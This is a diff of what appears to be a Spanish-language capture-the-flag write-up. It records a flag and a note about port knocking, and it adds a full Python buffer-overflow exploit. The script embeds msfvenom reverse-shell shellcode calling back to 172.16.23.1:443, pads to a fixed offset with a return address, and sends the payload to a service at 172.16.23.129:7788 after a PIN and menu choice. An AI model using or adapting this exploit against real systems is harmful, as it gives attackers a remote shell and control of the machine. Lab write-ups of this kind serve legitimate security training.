@@ -493,12 +493,43 @@ script de python con socket
 
 
 
+
 TUVE QUE HACER UN KNOCK qY EJECUTAR EL ARCHIVO DIRECTAMENTE EN MI PC
 
 flag6{R2gwc3RQcm90MGMwbHM=}
 
 
+```python
+#!/usr/bin/python3
 
+import socket
+
+offset = 168  
+
+# msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.16.23.1 LPORT=443 -f python -b "\x00\x0a\x0d"
+buf =  b""
+buf += b"\xdb\xda\xbb\x14\x85\x1c\x15\xd9\x74\x24\xf4\x5e"
+buf += b"\x2b\xc9\xb1\x12\x83\xee\xfc\x31\x5e\x13\x03\x4a"
+buf += b"\x96\xfe\xe0\x43\x43\x09\xe9\xf0\x30\xa5\x84\xf4"
+buf += b"\x3f\xa8\xe9\x9e\xf2\xab\x99\x07\xbd\x93\x50\x37"
+buf += b"\xf4\x92\x93\x5f\xab\x75\x73\x9e\xdb\x77\x7b\xa1"
+buf += b"\xa0\xf1\x9a\x11\xb0\x51\x0c\x02\x8e\x51\x27\x45"
+buf += b"\x3d\xd5\x65\xed\xd0\xf9\xfa\x85\x44\x29\xd2\x37"
+buf += b"\xfc\xbc\xcf\xe5\xad\x37\xee\xb9\x59\x85\x71"
+
+#padding
+buf += b"A"*(offset-len(buf))
+buf += b"\x63\x85\x04\x08\n"
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('172.16.23.129', 7788))
+
+s.send(b"48093572\n")
+data = s.recv(1024)
+s.send(b"3\n")
+data = s.recv(1024)
+s.send(buf)
+```
 ---
 
 
